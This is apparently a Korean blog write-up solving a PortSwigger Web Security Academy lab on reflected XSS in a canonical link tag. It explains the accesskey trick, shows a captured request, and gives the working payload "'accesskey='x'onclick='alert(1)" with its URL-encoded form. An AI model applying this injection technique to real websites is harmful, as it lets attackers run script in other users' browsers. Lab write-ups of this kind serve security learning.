---
layout: post
title: "Burp Academy-XSS 취약점: Reflected XSS in canonical link tag"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2024-10-11 21:55:00 +0900
---

# 개요
- 취약점 설명 주소: https://portswigger.net/web-security/cross-site-scripting/contexts
- 문제 주소: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag
- 난이도: PRACTITIONER (보통)


# 취약점 개요
꺾쇠 괄호(`<>`)를 인코딩하지만 속성을 삽입할 수 있는 웹사이트가 있을 수 있다. 때로는 표준 태그와 같이 일반적으로 이벤트를 자동으로 실행하지 않는 태그 내에서도 이러한 인젝션이 가능하다. Chrome에서 `accesskey` 속성과 사용자 상호작용을 사용하여 이 동작을 악용할 수 있다. accesskey 속성을 사용하면 특정 요소를 참조하는 키보드 단축키를 제공할 수 있다. accesskey 속성을 사용하면 다른 키(플랫폼마다 다름)와 함께 눌렀을 때 이벤트가 실행되도록 하는 문자를 정의할 수 있다. 이 랩에서는 accesskey 속성을 테스트하여 표준 태그를 익스플로잇할 수 있다. Port Swigger 리서치에서 개발한 기술을 사용하여 숨겨진 입력 필드에서 XSS를 익스플로잇할 수 있다.

## 플랫폼마다 다른 키 입력
참고로 플랫폼마다 다음과 같이 키 입력이 다르다. acessKey에 x 라는 값이 지정되어 있는 페이지에서 각 플랫폼마다 다음 키 입력을 누르면 이벤트가 발동한다. 

ALT+SHIFT+X (Windows)  
CTRL+ALT+X (MacOS)  
Alt+X (Linux)  

## 참고: [XSS in hidden input fields](https://portswigger.net/research/xss-in-hidden-input-fields)
본래 hidden 필드에 `accesskey` 속성을 넣었을 때 유저의 ALT+SHITF+X 입력과 함께 발동하는 테크닉이었지만 시간이 지난 뒤 Chrome 에서도 동작한다고 한다. 

다음과 같은 형태인 경우 XSS가 가능하다. 

```html
<link rel="canonical" accesskey="X" onclick="alert(1)" />
```



# 랩 개요
- 이 랩은 유저 인풋중 꺾쇠 괄호(`<>`)를 에스케이프 해서 link 태그에 반영한다. 
- 랩을 풀려면 XSS공격을 수행해서 alert 함수를 호출하게 한다. 
- 유저는 ALT+SHIFT+X, CTRL+ALT+X, Alt+X 키보드 입력을 정기적으로 수행한다. 
- 이 취약점은 Chrome에서만 재현가능하다. 

```
This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

ALT+SHIFT+X
CTRL+ALT+X 
Alt+X 
Please note that the intended solution to this lab is only possible in Chrome.
```

# 도전

1. XSS가 가능한 곳을 찾는다. HTML페이지의 link 태그에 URL값이 들어가는 것을 알 수 있다. 

![](/images/burp-academy-xss-20-1.png)

2. 싱글 쿼트(`'`)는 에스케이프 처리되지 않는 것을 알 수 있다. 이 것을 악용하여 XSS 페이로드를 삽입할 수 있어 보인다. 


```http
GET /post?postId=5&test=a'&accesskey=x HTTP/2
Host: 0a1200110410a67c9cddfc4500c6007b.web-security-academy.net
Cookie: session=KL9V3wfxcP2TAafpzSuVrN02UKQdRwCw
Sec-Ch-Ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1200110410a67c9cddfc4500c6007b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Priority: u=0, i


```


![](/images/burp-academy-xss-20-2.png)

3. XSS 페이로드를 만든다. 랩을 잘 살펴보면 싱글 쿼트가 파라메터 값의 앞에 위치하면(예를 들면 accessKey='x) HTML페이지에서 표시될 때 싱글쿼트가 아니라 더블쿼트로 바뀌는 것을 알아챌 수 있다. 

즉, 이랬던 것이...

![](/images/burp-academy-xss-20-3.png)

URL에 파라메터 `?postId=4&'accesskey='x`를 지정해서 요청을 보내보면 다음과 같이 더블퀘트로 바껴서 응답이 돌아온다. 

![](/images/burp-academy-xss-20-4.png)

4. 이를 좀더 다듬으면 다음과 같이 페이로드를 만들 수 있다. 

```
/post?postId=4&'accesskey='x'onclick='alert(1)
```

URL 인코딩하면 다음과 같이 된다. 

```
/post?postId=4&%27accesskey=%27x%27onclick=%27alert(1)
```

5. 이 것을 서버에 요청을 보내면 다음과 같이 XSS공격이 가능한 형태의 HTTP 페이지가 회신된다. 

![](/images/burp-academy-xss-20-5.png)

6. 잠시 기다리면 문제가 풀렸다는 메시지가 표시된다. 

![](/images/burp-academy-xss-20-success.png)
